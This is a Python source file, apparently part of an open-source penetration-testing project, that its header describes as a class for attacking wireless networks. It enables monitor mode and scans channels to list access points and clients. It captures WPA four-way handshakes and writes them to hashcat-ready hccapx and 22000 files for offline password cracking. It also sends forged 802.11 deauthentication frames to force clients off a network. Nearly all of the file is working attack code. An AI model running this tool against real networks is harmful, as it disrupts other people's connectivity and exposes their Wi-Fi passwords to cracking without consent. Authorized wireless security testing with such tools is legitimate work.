# region Description
"""
wifi.py: Class for attack on wireless network
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from raw_packet.Utils.base import Base
from raw_packet.Utils.tm import ThreadManager
from scapy.all import rdpcap, wrpcap, sendp, Ether, RadioTap
from scapy.all import Dot11, Dot11FCS, Dot11Elt, Dot11EltRSN, Dot11EltRates, Dot11EltMicrosoftWPA
from scapy.all import Dot11EltVendorSpecific
from scapy.all import Dot11Beacon, Dot11CCMP, Dot11Deauth, EAPOL
from typing import Dict, Union, List
from struct import pack, unpack
from time import strftime
from binascii import unhexlify
from subprocess import CompletedProcess, run, PIPE, Popen
from os import mkdir, listdir, remove
from os.path import getctime, isdir
from os.path import join as path_join
from shutil import rmtree
from time import sleep
from datetime import datetime
# endregion


# region Main class - WiFi
class WiFi:

    # region Set variables

    # region Public variables
    bssids: Dict[str, Dict[str, Union[int, float, str, bytes, List[Union[int, str]]]]] = dict()
    wpa_handshakes: Dict[str, Dict[str, Dict[str, Union[int, float, str, bytes]]]] = dict()
    deauth_packets: List[Dict[str, Union[int, float, str]]] = list()
    channels: List[Dict[str, Union[int, float]]] = list()
    # endregion

    # region Private variables
    _base: Base = Base()
    _thread_manager: ThreadManager = ThreadManager(25)

    _interface: Union[None, str] = None
    _switch_between_channels: bool = True
    _prefix: str = '    '
    _airport_path: str = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport'
    _wifi_channels: Dict[str, List[int]] = {
        '2,4 GHz': [1, 2, 3, 5, 6, 7, 8, 9, 10, 11],
        '5 Ghz': [36, 40, 44, 48, 52, 56, 60, 64, 132, 136, 140, 144]
    }
    _wifi_channel_frequencies: Dict[int, int] = {
        2412: 1,
        2417: 2,
        2422: 3,
        2427: 4,
        2432: 5,
        2437: 6,
        2442: 7,
        2447: 8,
        2452: 9,
        2457: 10,
        2462: 11
    }
    _pcap_directory: str = '/tmp/raw-packet/'
    _akmsuite_types: Dict[int, str] = {
        0x00: "Reserved",
        0x01: "802.1X",
        0x02: "PSK"
    }
    _cipher_types: Dict[int, str] = {
        0x00: "Use group cipher suite",
        0x01: "WEP-40",
        0x02: "TKIP",
        0x03: "Reserved",
        0x04: "CCMP",
        0x05: "WEP-104"
    }

    # endregion

    # endregion

    # region Private methods

    # region Constructor
    def __init__(self,
                 wireless_interface,
                 wifi_channel: Union[None, int] = None,
                 ap_bssid: Union[None, str] = None) -> None:
        """
        Constructor for WiFi class
        :param wireless_interface: Wireless interface name (example: 'wlan0')
        :param wifi_channel: WiFi channel number (example: 1)
        :param ap_bssid: AP BSSID (example: '01:23:45:67:89:0a')
        :param client_mac_address: Client MAC address (example: '01:23:45:67:89:0b')
        """
        try:
            # Set directory with pcap files
            if self._base.get_platform().startswith('Windows'):
                self._pcap_directory = 'C:\\Windows\\Temp\\raw-packet\\'

            # Check network interface is wireless
            assert self._base.check_network_interface_is_wireless(interface_name=wireless_interface), \
                'Network interface: ' + self._base.error_text(wireless_interface) + ' is not wireless!'
            self._interface = wireless_interface

            # Checking the ability to enable monitoring mode
            assert self._enable_monitor_mode(), \
                'Failed to enable monitor mode on wireless interface: ' + self._base.error_text(self._interface)

            # Set WiFi channel
            if wifi_channel is not None:
                assert self.validate_wifi_channel(wifi_channel=wifi_channel), \
                    'Bad WiFi channel: ' + self._base.error_text(str(wifi_channel))
                if wifi_channel in self._wifi_channels['2,4 GHz']:
                    self._wifi_channels['2,4 GHz'] = [wifi_channel]
                    self._wifi_channels['5 Ghz'] = list()
                else:
                    self._wifi_channels['2,4 GHz'] = list()
                    self._wifi_channels['5 Ghz'] = [wifi_channel]
                self._switch_wifi_channel(channel=wifi_channel)

            # Check tshark start
            assert self._start_tshark(bssid=ap_bssid), 'Failed to start tshark!'

            # Create thread for reading pcap files
            self._thread_manager.add_task(self._read_pcap_files)

            # Switching between WiFi channels
            if wifi_channel is None:
                self._thread_manager.add_task(self._scan_ssids)

        except AssertionError as Error:
            self._base.print_error(Error.args[0])
            exit(1)

    # endregion

    # region Enable monitor mode on interface
    def _enable_monitor_mode(self,
                             wireless_interface: Union[None, str] = None) -> bool:
        # Set wireless interface
        if wireless_interface is None:
            wireless_interface = self._interface

        # Mac OS
        if self._base.get_platform().startswith('Darwin'):
            run([self._airport_path + ' ' + wireless_interface + ' --disassociate'], shell=True)
            return True

        # Linux
        elif self._base.get_platform().startswith('Linux'):
            interface_mode: CompletedProcess = run(['iwconfig ' + wireless_interface], shell=True, stdout=PIPE)
            interface_mode: str = interface_mode.stdout.decode('utf-8')
            if 'Mode:Monitor' not in interface_mode:
                self._base.print_info('Set monitor mode on wireless interface: ', wireless_interface)
                run(['ifconfig ' + wireless_interface + ' down'], shell=True, stdout=PIPE)
                run(['iwconfig ' + wireless_interface + ' mode monitor'], shell=True, stdout=PIPE)
                run(['ifconfig ' + wireless_interface + ' up'], shell=True, stdout=PIPE)
                interface_mode: CompletedProcess = run(['iwconfig ' + wireless_interface], shell=True, stdout=PIPE)
                interface_mode: str = interface_mode.stdout.decode('utf-8')
                if 'Mode:Monitor' not in interface_mode:
                    return True
                else:
                    return False
            else:
                self._base.print_info('Wireless interface: ', wireless_interface, ' already in mode monitor')
                return True

        # Windows
        elif self._base.get_platform().startswith('Windows'):
            wlanhelper: Popen = \
                Popen('wlanhelper "' + wireless_interface + '" mode', shell=True, stdout=PIPE, stderr=PIPE)
            wlanhelper_output, wlanhelper_error = wlanhelper.communicate()
            assert wlanhelper_error == b'', 'Library Npcap not found. ' \
                                            'Install Npcap: https://nmap.org/npcap/ and ' \
                                            'Nmap: https://nmap.org/download.html'
            if b'monitor' in wlanhelper_output:
                self._base.print_info('Wireless interface: ', wireless_interface, ' already in mode monitor')
                return True
            else:
                wlanhelper: Popen = \
                    Popen('wlanhelper "' + wireless_interface + '" mode monitor', shell=True, stdout=PIPE, stderr=PIPE)
                wlanhelper_output, wlanhelper_error = wlanhelper.communicate()
                if b'Success' in wlanhelper_output:
                    return True
                else:
                    return False

        # Other
        else:
            self._base.print_error('This platform: ', self._base.get_platform(), ' is not supported')
            return False

    # endregion

    # region Switch WiFi channel on interface
    def _switch_wifi_channel(self, channel: int = 1) -> None:
        assert self.validate_wifi_channel(wifi_channel=channel)
        self.channels.append({'channel': channel, 'timestamp': datetime.utcnow().timestamp()})

        # Mac OS
        if self._base.get_platform().startswith('Darwin'):
            run([self._airport_path + ' ' + self._interface + ' --channel=' + str(channel)], shell=True)

        # Linux
        elif self._base.get_platform().startswith('Linux'):
            run(['iwconfig ' + self._interface + ' channel ' + str(channel)], shell=True)

        # Windows
        elif self._base.get_platform().startswith('Windows'):
            wlanhelper: Popen = Popen('wlanhelper "' + self._interface + '" channel ' + str(channel),
                                      shell=True, stdout=PIPE, stderr=PIPE)
            wlanhelper_output, wlanhelper_error = wlanhelper.communicate()
            if wlanhelper_error != b'' or b'Error' in wlanhelper_output:
                self._base.print_error('Failed to switch channel: ', str(channel))
                exit(1)

        # Other
        else:
            self._base.print_error('This platform: ', self._base.get_platform(), ' is not supported')
            exit(1)

    # endregion

    # region Convert MAC address
    @staticmethod
    def _convert_mac(mac_address: str) -> bytes:
        return unhexlify(mac_address.lower().replace(':', ''))

    # endregion

    # region Parse EAPOL payload
    @staticmethod
    def _parse_eapol(packet: bytes) -> Union[None, Dict[str, Union[int, bytes]]]:
        try:
            assert len(packet) >= 99, 'Bad EAPOL payload'
            eapol_parsed_payload: Dict[str, Union[int, bytes]] = dict()
            eapol_header = unpack('!' '2B' 'H' 'B' '2H' 'Q', packet[:17])
            eapol_parsed_payload['version'] = int(eapol_header[0])
            eapol_parsed_payload['type'] = int(eapol_header[1])
            eapol_parsed_payload['length'] = int(eapol_header[2])
            eapol_parsed_payload['key descriptor'] = int(eapol_header[3])
            eapol_parsed_payload['key information'] = int(eapol_header[4])
            eapol_parsed_payload['key length'] = int(eapol_header[5])
            eapol_parsed_payload['replay counter'] = int(eapol_header[6])

            eapol_parsed_payload['wpa key nonce'] = bytes(packet[17:49])
            eapol_parsed_payload['key iv'] = bytes(packet[49:65])
            eapol_parsed_payload['wpa key rsc'] = bytes(packet[65:73])
            eapol_parsed_payload['wpa key id'] = bytes(packet[73:81])
            eapol_parsed_payload['wpa key mic'] = bytes(packet[81:97])
            eapol_parsed_payload['wpa key length'] = int(unpack('!H', packet[97:99])[0])
            eapol_parsed_payload['wpa key data'] = bytes(packet[99: 99 + eapol_parsed_payload['wpa key length']])

            assert 99 + eapol_parsed_payload['wpa key length'] == len(packet), 'Bad EAPOL payload'
            return eapol_parsed_payload

        except IndexError:
            return None

        except AssertionError:
            return None

    # endregion

    # region Analyze 802.11 packet
    def _analyze_packet(self, packet) -> None:
        try:

            # region 802.11 Beacon
            if packet.haslayer(Dot11Beacon) and \
                    packet.haslayer(Dot11Elt) and \
                    packet[Dot11FCS].type == 0 and \
                    packet[Dot11FCS].subtype == 8 and \
                    packet[Dot11FCS].FCfield.value == 0 and \
                    packet[Dot11FCS].addr1 == 'ff:ff:ff:ff:ff:ff' and \
                    packet[Dot11FCS].addr2 != '' and \
                    packet[Dot11FCS].addr2 == packet[Dot11FCS].addr3 and \
                    packet[RadioTap].dBm_AntSignal > -95:

                # First Beacon frame
                if packet[Dot11FCS].addr2 not in self.bssids.keys():
                    self.bssids[packet[Dot11FCS].addr2]: \
                        Dict[str, Union[int, float, str, bytes, List[Union[int, str]]]] = dict()
                    if packet[Dot11EltRates].payload.ID == 3:
                        self.bssids[packet[Dot11FCS].addr2]['channel']: int = \
                            int.from_bytes(packet[Dot11EltRates].payload.info, 'little')
                    else:
                        self.bssids[packet[Dot11FCS].addr2]['channel']: int = \
                            self._wifi_channel_frequencies[packet[RadioTap].ChannelFrequency]
                    self.bssids[packet[Dot11FCS].addr2]['packets']: int = 0
                    self.bssids[packet[Dot11FCS].addr2]['clients']: List[str] = list()
                    self.bssids[packet[Dot11FCS].addr2]['signals']: List[int] = list()
                    self.bssids[packet[Dot11FCS].addr2]['essids']: List[str] = list()
                    self.bssids[packet[Dot11FCS].addr2]['enc list']: List[str] = list()
                    self.bssids[packet[Dot11FCS].addr2]['auth list']: List[str] = list()
                    self.bssids[packet[Dot11FCS].addr2]['cipher list']: List[str] = list()

                # Next Beacon frame
                elif self.bssids[packet[Dot11FCS].addr2]['packets'] > 10:

                    # Choose the average value of the Signal
                    self.bssids[packet[Dot11FCS].addr2]['signal']: int = \
                        max(self.bssids[packet[Dot11FCS].addr2]['signals'],
                            key=self.bssids[packet[Dot11FCS].addr2]['signals'].count)

                    # Choose the average value of the ESSID
                    self.bssids[packet[Dot11FCS].addr2]['essid']: str = \
                        max(self.bssids[packet[Dot11FCS].addr2]['essids'],
                            key=self.bssids[packet[Dot11FCS].addr2]['essids'].count)

                    # Choose the average value of the Encryption
                    self.bssids[packet[Dot11FCS].addr2]['enc']: str = \
                        max(self.bssids[packet[Dot11FCS].addr2]['enc list'],
                            key=self.bssids[packet[Dot11FCS].addr2]['enc list'].count)

                    # Choose the average value of the Athentication
                    self.bssids[packet[Dot11FCS].addr2]['auth']: str = \
                        max(self.bssids[packet[Dot11FCS].addr2]['auth list'],
                            key=self.bssids[packet[Dot11FCS].addr2]['auth list'].count)

                    # Choose the average value of the Cipher
                    self.bssids[packet[Dot11FCS].addr2]['cipher']: str = \
                        max(self.bssids[packet[Dot11FCS].addr2]['cipher list'],
                            key=self.bssids[packet[Dot11FCS].addr2]['cipher list'].count)

                    # Delete first value from lists
                    self.bssids[packet[Dot11FCS].addr2]['signals'].pop(0)
                    self.bssids[packet[Dot11FCS].addr2]['essids'].pop(0)
                    self.bssids[packet[Dot11FCS].addr2]['enc list'].pop(0)
                    self.bssids[packet[Dot11FCS].addr2]['auth list'].pop(0)
                    self.bssids[packet[Dot11FCS].addr2]['cipher list'].pop(0)

                    # Decrement number of packets
                    self.bssids[packet[Dot11FCS].addr2]['packets'] -= 1

                    # Wait 1 seconds
                    assert (datetime.utcnow().timestamp() - self.bssids[packet[Dot11FCS].addr2]['timestamp']) > 1, \
                        'Less than 1 seconds have passed'

                # Increment number of packets
                self.bssids[packet[Dot11FCS].addr2]['packets'] += 1
                # Update timestamp
                self.bssids[packet[Dot11FCS].addr2]['timestamp']: datetime = datetime.utcnow().timestamp()

                # Append signal and ESSID in lists
                self.bssids[packet[Dot11FCS].addr2]['signals'].append(packet[RadioTap].dBm_AntSignal)
                self.bssids[packet[Dot11FCS].addr2]['essids'].append(packet[Dot11Elt].info.decode('utf-8'))

                # region Encryption info in beacon
                if packet.haslayer(Dot11EltRSN) and packet.haslayer(Dot11EltMicrosoftWPA):
                    self.bssids[packet[Dot11FCS].addr2]['enc list'].append('WPA/WPA2')
                    self.bssids[packet[Dot11FCS].addr2]['auth list']. \
                        append(self._akmsuite_types[packet[Dot11EltMicrosoftWPA].akm_suites[0].suite])
                    self.bssids[packet[Dot11FCS].addr2]['cipher list']. \
                        append(self._cipher_types[packet[Dot11EltMicrosoftWPA].group_cipher_suite[0].cipher])

                elif packet.haslayer(Dot11EltRSN):
                    self.bssids[packet[Dot11FCS].addr2]['enc list'].append('WPA2')
                    self.bssids[packet[Dot11FCS].addr2]['auth list']. \
                        append(self._akmsuite_types[packet[Dot11EltRSN].akm_suites[0].suite])
                    self.bssids[packet[Dot11FCS].addr2]['cipher list']. \
                        append(self._cipher_types[packet[Dot11EltRSN].group_cipher_suite[0].cipher])

                elif packet.haslayer(Dot11EltMicrosoftWPA):
                    self.bssids[packet[Dot11FCS].addr2]['enc list'].append('WPA')
                    self.bssids[packet[Dot11FCS].addr2]['auth list']. \
                        append(self._akmsuite_types[packet[Dot11EltMicrosoftWPA].akm_suites[0].suite])
                    self.bssids[packet[Dot11FCS].addr2]['cipher list']. \
                        append(self._cipher_types[packet[Dot11EltMicrosoftWPA].group_cipher_suite[0].cipher])

                elif packet.haslayer(Dot11EltVendorSpecific):
                    self.bssids[packet[Dot11FCS].addr2]['enc list'].append('WEP')
                    self.bssids[packet[Dot11FCS].addr2]['auth list'].append('-')
                    self.bssids[packet[Dot11FCS].addr2]['cipher list'].append('WEP')

                else:
                    self.bssids[packet[Dot11FCS].addr2]['enc list'].append('UNKNOWN')
                    self.bssids[packet[Dot11FCS].addr2]['auth list'].append('UNKNOWN')
                    self.bssids[packet[Dot11FCS].addr2]['cipher list'].append('UNKNOWN')
                # endregion

            # endregion

            # region 802.11 Null function
            if packet[Dot11FCS].type == 2 and \
                    packet[Dot11FCS].subtype == 4 and \
                    packet[Dot11FCS].FCfield.value % 2 != 0 and \
                    packet[Dot11FCS].addr1 == packet[Dot11FCS].addr3 and \
                    packet[Dot11FCS].addr1 != packet[Dot11FCS].addr2 and \
                    packet[Dot11FCS].payload.name == 'NoPayload':
                try:
                    if packet[Dot11FCS].addr2 not in self.bssids[packet[Dot11FCS].addr1]['clients']:
                        self.bssids[packet[Dot11FCS].addr1]['clients'].append(packet[Dot11FCS].addr2)
                except KeyError:
                    self.bssids[packet[Dot11FCS].addr1]: \
                        Dict[str, Union[int, float, str, bytes, List[Union[int, str]]]] = dict()
                    self.bssids[packet[Dot11FCS].addr1]['clients']: List[str] = list([packet[Dot11FCS].addr2])
            # endregion

            # region 802.11 CCMP and Direction: Client -> AP (from Client to AP)
            test = packet
            test = 1
            if packet.haslayer(Dot11CCMP) and \
                    packet[Dot11FCS].type == 2 and \
                    packet[Dot11FCS].subtype == 8 and \
                    packet[Dot11FCS].FCfield.value % 2 != 0 and \
                    packet[Dot11FCS].addr1 != packet[Dot11FCS].addr2 and \
                    packet[Dot11CCMP].payload.name == 'NoPayload':
                try:
                    if packet[Dot11FCS].addr2 not in self.bssids[packet[Dot11FCS].addr1]['clients']:
                        self.bssids[packet[Dot11FCS].addr1]['clients'].append(packet[Dot11FCS].addr2)
                except KeyError:
                    self.bssids[packet[Dot11FCS].addr1]: \
                        Dict[str, Union[int, float, str, bytes, List[Union[int, str]]]] = dict()
                    self.bssids[packet[Dot11FCS].addr1]['clients']: List[str] = list([packet[Dot11FCS].addr2])
            # endregion

            # region EAPOL Message 1 of 4
            if packet.haslayer(EAPOL) and \
                    packet[Dot11FCS].type == 2 and \
                    packet[Dot11FCS].subtype == 8 and \
                    packet[Dot11FCS].SC == 0 and \
                    packet[Dot11FCS].FCfield.value % 2 == 0 and \
                    packet[Dot11FCS].addr1 != packet[Dot11FCS].addr2 and \
                    packet[Dot11FCS].addr2 == packet[Dot11FCS].addr3:

                eapol: Union[None, Dict[str, Union[int, bytes]]] = self._parse_eapol(packet[EAPOL].original)
                bssid: str = packet[Dot11FCS].addr2
                client: str = packet[Dot11FCS].addr1

                if bssid not in self.wpa_handshakes.keys():
                    self.wpa_handshakes[bssid]: Dict[str, Union[str, Dict[str, Union[int, float, str, bytes]]]] = dict()
                assert client not in self.wpa_handshakes[bssid].keys(), \
                    'First EAPOL message already in the dictionary!'

                self.wpa_handshakes[bssid][client]: Dict[str, Union[int, float, str, bytes]] = dict()

                self.wpa_handshakes[bssid][client]['essid'] = 'Unknown'
                if bssid in self.bssids.keys() and 'essid' in self.bssids[bssid].keys():
                    self.wpa_handshakes[bssid][client]['essid'] = self.bssids[bssid]['essid']

                self.wpa_handshakes[bssid][client]['key version'] = eapol['version']
                self.wpa_handshakes[bssid][client]['anonce'] = eapol['wpa key nonce']
                self.wpa_handshakes[bssid][client]['pcap file']: str = \
                    'wpa' + str(self.wpa_handshakes[bssid][client]['key version']) + \
                    '_' + bssid.replace(':', '') + \
                    '_' + client.replace(':', '') + \
                    '_' + strftime('%Y%m%d_%H%M%S') + '.pcap'
                wrpcap(self.wpa_handshakes[bssid][client]['pcap file'], packet, append=True)
            # endregion

            # region EAPOL Message 2 of 4
            if packet.haslayer(EAPOL) and \
                    packet[Dot11FCS].type == 2 and \
                    packet[Dot11FCS].subtype == 8 and \
                    packet[Dot11FCS].SC == 0 and \
                    packet[Dot11FCS].FCfield.value % 2 != 0 and \
                    packet[Dot11FCS].addr1 != packet[Dot11FCS].addr2 and \
                    packet[Dot11FCS].addr1 == packet[Dot11FCS].addr3:

                eapol: Union[None, Dict[str, Union[int, bytes]]] = self._parse_eapol(packet[EAPOL].original)
                bssid: str = packet[Dot11FCS].addr1
                client: str = packet[Dot11FCS].addr2

                assert bssid in self.wpa_handshakes.keys(), \
                    'Not found first EAPOL message'
                assert client in self.wpa_handshakes[bssid].keys(), \
                    'Not found first EAPOL message'
                assert 'eapol' not in self.wpa_handshakes[bssid][client].keys(), \
                    'Authentication session already captured'

                self.wpa_handshakes[bssid][client]['timestamp']: datetime = datetime.utcnow().timestamp()
                self.wpa_handshakes[bssid][client]['snonce'] = eapol['wpa key nonce']
                self.wpa_handshakes[bssid][client]['key mic'] = eapol['wpa key mic']
                self.wpa_handshakes[bssid][client]['eapol'] = \
                    b''.join([packet[EAPOL].original[:81],
                              b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
                              pack('!H', eapol['wpa key length']),
                              packet[EAPOL].original[99:]])

                # region Content for hccapx file. Format hccapx is a custom format for hashcat
                hccapx: bytes = b'HCPX'  # Signature
                hccapx += b'\x04\x00\x00\x00'  # Version
                hccapx += b'\x02'  # Message pair
                hccapx += pack('B', len(self.wpa_handshakes[bssid][client]['essid']))  # ESSID length
                hccapx += self.wpa_handshakes[bssid][client]['essid'].encode('utf-8')  # ESSID
                # Reserved 32 bytes for ESSID
                hccapx += b''.join(b'\x00' for _ in range(32 - len(self.wpa_handshakes[bssid][client]['essid'])))
                hccapx += pack('B', self.wpa_handshakes[bssid][client]['key version'])  # Key version
                hccapx += self.wpa_handshakes[bssid][client]['key mic']  # Key mic
                hccapx += self._convert_mac(bssid)  # BSSID
                hccapx += self.wpa_handshakes[bssid][client]['anonce']  # AP Key nonce
                hccapx += self._convert_mac(client)  # Client MAC address
                hccapx += self.wpa_handshakes[bssid][client]['snonce']  # Client Key nonce
                hccapx += pack('H', len(self.wpa_handshakes[bssid][client]['eapol']))  # Eapol length
                hccapx += self.wpa_handshakes[bssid][client]['eapol']
                # Reserved 256 bytes for Client EAPOL key data
                hccapx += b''.join(b'\x00' for _ in range(256 - len(self.wpa_handshakes[bssid][client]['eapol'])))
                self.wpa_handshakes[bssid][client]['hccapx content']: bytes = hccapx
                self.wpa_handshakes[bssid][client]['hccapx file']: str = \
                    'wpa' + str(self.wpa_handshakes[bssid][client]['key version']) + \
                    '_' + bssid.replace(':', '') + \
                    '_' + client.replace(':', '') + \
                    '_' + strftime('%Y%m%d_%H%M%S') + '.hccapx'
                # endregion

                # region Hashcat 22000 format
                hashcat_22000: str = 'WPA*'  # Signature

                # Key version
                hashcat_22000 += \
                    '{0:0=2d}'.format(self.wpa_handshakes[bssid][client]['key version']) + '*'

                # Key mic
                hashcat_22000 += \
                    ''.join('{:02x}'.format(x) for x in self.wpa_handshakes[bssid][client]['key mic']) + '*'

                # BSSID
                hashcat_22000 += bssid.replace(':', '') + '*'

                # Client MAC address
                hashcat_22000 += client.replace(':', '') + '*'

                # ESSID
                hashcat_22000 += \
                    ''.join('{:02x}'.format(ord(x)) for x in self.wpa_handshakes[bssid][client]['essid']) + '*'

                # AP Key nonce
                hashcat_22000 += \
                    ''.join('{:02x}'.format(x) for x in self.wpa_handshakes[bssid][client]['anonce']) + '*'

                # Client EAPOL key data
                hashcat_22000 += \
                    ''.join('{:02x}'.format(x) for x in self.wpa_handshakes[bssid][client]['eapol']) + '*'

                # End of file
                hashcat_22000 += '00\n'

                # Save to wpa_handshakes dictionary
                self.wpa_handshakes[bssid][client]['hashcat 22000 content']: str = hashcat_22000
                self.wpa_handshakes[bssid][client]['hashcat 22000 file']: str = \
                    'wpa' + str(self.wpa_handshakes[bssid][client]['key version']) + \
                    '_' + bssid.replace(':', '') + \
                    '_' + client.replace(':', '') + \
                    '_' + strftime('%Y%m%d_%H%M%S') + '.22000'
                # endregion

                # region Print Key info
                # print_anonce: str = ' '.join('{:02X}'.format(x) for x in self.wpa_handshakes[bssid]['anonce'])
                # print_snonce: str = ' '.join('{:02X}'.format(x) for x in self.wpa_handshakes[bssid]['snonce'])
                # print_key_mic: str = ' '.join('{:02X}'.format(x) for x in self.wpa_handshakes[bssid]['key mic'])
                # print_eapol: str = ' '.join('{:02X}'.format(x) for x in self.wpa_handshakes[bssid]['eapol'])
                #
                # self._base.print_success('ESSID (length: ' + str(len(self.wpa_handshakes[bssid][client]['essid'])) + '): ',
                #                          self.wpa_handshakes[bssid][client]['essid'])
                # self._base.print_success('Key version: ', str(self.wpa_handshakes[bssid]['key version']))
                # self._base.print_success('BSSID: ', str(bssid))
                # self._base.print_success('STA: ', str(self.wpa_handshakes[bssid]['sta']))
                # self._base.print_success('Anonce: \n', fill(print_anonce, width=52, initial_indent=self._prefix,
                #                                             subsequent_indent=self._prefix))
                # self._base.print_success('Snonce: \n', fill(print_snonce, width=52, initial_indent=self._prefix,
                #                                             subsequent_indent=self._prefix))
                # self._base.print_success('Key MIC: \n', fill(print_key_mic, width=52, initial_indent=self._prefix,
                #                                              subsequent_indent=self._prefix))
                # self._base.print_success('EAPOL: \n', fill(print_eapol, width=52, initial_indent=self._prefix,
                #                                            subsequent_indent=self._prefix))
                # endregion

                # region Save EAPOL session to hccapx, 22000, pcap files
                with open(self.wpa_handshakes[bssid][client]['hccapx file'], 'wb') as hccapx_file:
                    hccapx_file.write(self.wpa_handshakes[bssid][client]['hccapx content'])
                with open(self.wpa_handshakes[bssid][client]['hashcat 22000 file'], 'w') as hccapx_file:
                    hccapx_file.write(self.wpa_handshakes[bssid][client]['hashcat 22000 content'])
                wrpcap(self.wpa_handshakes[bssid][client]['pcap file'], packet, append=True)
                # endregion

            # endregion

        except AssertionError:
            pass

        except IndexError:
            pass

        except UnicodeDecodeError:
            pass

        except KeyError:
            pass

        except:
            pass

    # endregion

    # region Start tshark program
    def _start_tshark(self,
                      wireless_interface: Union[None, str] = None,
                      pcap_files_directory: Union[None, str] = None,
                      bssid: Union[None, str] = None,
                      sniff_eapol: bool = False) -> bool:
        # Check BSSID
        first_4_bytes_of_bssid: str = ''
        last_2_bytes_of_bssid: str = ''
        if bssid is not None:
            assert self._base.mac_address_validation(mac_address=bssid), 'Bad BSSID: ' + self._base.error_text(bssid)
            first_4_bytes_of_bssid += '0x' + bssid[0:11].replace(':', '')
            last_2_bytes_of_bssid += '0x' + bssid[12:17].replace(':', '')

        # Set wireless interface
        if wireless_interface is None:
            wireless_interface = self._interface

        # Set directory with pcap files
        if pcap_files_directory is None:
            pcap_files_directory = self._pcap_directory

        # Kill all tshark processes
        self._base.kill_process_by_name(process_name='tshark')

        # Set path for tshark
        if self._base.get_platform().startswith('Windows'):
            tshark_path: str = '"C:\\Program Files\\Wireshark\\tshark.exe"'
        else:
            tshark_path: str = 'tshark'

        # Set tshark command
        if sniff_eapol:
            if bssid is None:
                tshark_command: str = \
                    tshark_path + ' -y "IEEE802_11_RADIO" -I -i "' + wireless_interface + \
                    '" -b duration:1 -w ' + pcap_files_directory + \
                    'sniff.pcap -f "wlan[0:2] == 0x8801 or wlan[0:2] == 0x8802"'
            else:
                tshark_command: str = \
                    tshark_path + ' -y "IEEE802_11_RADIO" -I -i "' + wireless_interface + \
                    '" -b duration:1 -w ' + pcap_files_directory + \
                    'sniff.pcap -f "(wlan[0:2] == 0x8801 or wlan[0:2] == 0x8802)' \
                    ' and wlan[16:4] == ' + first_4_bytes_of_bssid + \
                    ' and wlan[20:2] == ' + last_2_bytes_of_bssid + '"'
        else:
            if bssid is None:
                tshark_command: str = \
                    tshark_path + ' -y "IEEE802_11_RADIO" -I -i "' + wireless_interface + \
                    '" -b duration:1 -w ' + pcap_files_directory + \
                    'sniff.pcap -f "(wlan type data) or (wlan type mgt subtype beacon)"'
            else:
                tshark_command: str = \
                    tshark_path + ' -y "IEEE802_11_RADIO" -I -i "' + wireless_interface + \
                    '" -b duration:1 -w ' + pcap_files_directory + \
                    'sniff.pcap -f "((wlan type data) or (wlan type mgt subtype beacon))' \
                    ' and wlan[16:4] == ' + first_4_bytes_of_bssid + \
                    ' and wlan[20:2] == ' + last_2_bytes_of_bssid + '"'

        # Run tshark process
        if self._base.get_platform().startswith('Windows'):
            Popen(tshark_command, shell=True, stdout=PIPE, stderr=PIPE)
        else:
            Popen([tshark_command], shell=True, stdout=PIPE, stderr=PIPE)

        return True

    # endregion

    # region Read pcap files from directory
    def _read_pcap_files(self,
                         pcap_files_directory: Union[None, str] = None) -> None:
        # Set directory with pcap files
        if pcap_files_directory is None:
            pcap_files_directory = self._pcap_directory

        # Clear directory for pcap files
        if not isdir(pcap_files_directory):
            mkdir(pcap_files_directory)
        else:
            rmtree(pcap_files_directory)
            mkdir(pcap_files_directory)

        while True:
            # Make list with pcap files
            pcap_files: List[str] = [path_join(pcap_files_directory, file) for file in listdir(pcap_files_directory)]

            # If length of pcap file more than one
            if len(pcap_files) > 1:

                # Get oldest pcap file
                pcap_file = min(pcap_files, key=getctime)

                # Get packets from oldest pcap file
                packets = rdpcap(pcap_file)

                # Delete oldest pcap file
                remove(pcap_file)

                # Analyze packets
                for packet in packets:
                    try:
                        assert packet.haslayer(RadioTap), 'Is not RadioTap packet!'
                        assert packet.haslayer(Dot11FCS), 'Is not IEEE 802.11 packet!'
                        self._analyze_packet(packet)

                    except IndexError:
                        pass

                    except AssertionError:
                        pass

            # Wait one second
            else:
                sleep(1)

    # endregion

    # region Scan WiFi channels and search AP ssids
    def _scan_ssids(self):
        while True:
            if self._switch_between_channels and len(self._wifi_channels['2,4 GHz']) > 1:
                for channel in self._wifi_channels['2,4 GHz']:
                    self._switch_wifi_channel(channel=int(channel))
                    sleep(5)
            else:
                sleep(2)

    # endregion

    # endregion

    # region Public methods

    # region Validate WiFi channel
    @staticmethod
    def validate_wifi_channel(wifi_channel: int) -> bool:
        return True if wifi_channel in \
                       [1, 2, 3, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 52, 56, 60, 64, 132, 136, 140, 144] else False

    # endregion

    # region Set WiFi chanel and prohibit switching between channels
    def set_wifi_channel(self, channel: int = 1) -> None:
        self._switch_between_channels = False
        self._switch_wifi_channel(channel=channel)

    # endregion

    # region Sending deauth packets
    def send_deauth(self,
                    bssid: str = '01:23:45:67:89:0a',
                    client: str = '01:23:45:67:89:0b',
                    number_of_deauth_packets: int = 50) -> None:
        """
        Sending 802.11 deauth packets
        :param bssid: BSSID (example: '01:23:45:67:89:0a')
        :param client: A client MAC address for deauth (example: '01:23:45:67:89:0b')
        :param number_of_deauth_packets: The number of deauth packets for one iteration (default: 50)
        :return: None
        """
        client_deauth_packet: bytes = RadioTap() / \
                                      Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / \
                                      Dot11Deauth(reason=7)
        ap_deauth_packet: bytes = RadioTap() / \
                                  Dot11(type=0, subtype=12, addr1=bssid, addr2=client, addr3=bssid) / \
                                  Dot11Deauth(reason=7)

        for _ in range(int(number_of_deauth_packets / 2)):
            sendp(client_deauth_packet, iface=self._interface, monitor=True, verbose=False)
            sendp(ap_deauth_packet, iface=self._interface, monitor=True, verbose=False)

        self.deauth_packets.append({'packets': number_of_deauth_packets,
                                    'bssid': bssid, 'client': client,
                                    'timestamp': datetime.utcnow().timestamp()})
    # endregion

    # endregion

# endregion
